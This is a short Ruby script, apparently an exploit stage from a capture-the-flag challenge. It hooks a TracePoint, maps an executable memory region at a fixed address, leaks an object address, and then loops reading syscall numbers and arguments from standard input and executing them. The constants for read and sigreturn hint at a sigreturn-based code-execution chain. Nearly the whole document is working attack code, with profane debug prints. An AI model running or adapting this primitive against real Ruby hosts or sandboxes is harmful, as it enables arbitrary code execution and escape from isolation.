$ENABLED = true

TracePoint.new(:line) {
  if not $ENABLED then
      next
  end
  $ENABLED = false

  nr_mmap = 9
  nr_read = 0
  nr_sigreturn = 15
  addr = syscall(nr_mmap, 0xdead0000, 0x8000, 7, 0x32, -1, 0)
  puts addr.to_s(16)

  puts "damn"
  p = Proc.new {}
  puts p.object_id
  puts "crap"

  while true do
      puts "fuck"
      cmd = gets.chomp
      if cmd == "gc" then
          GC.start
      end
      nr = gets.chomp
      a = gets.chomp
      b = gets.chomp
      c = gets.chomp
      d = gets.chomp
      puts "shit"
      syscall(nr.to_i, a.to_i, b.to_i, c.to_i, d.to_i)
      puts "crap"
      GC.start
  end
 
}.enable
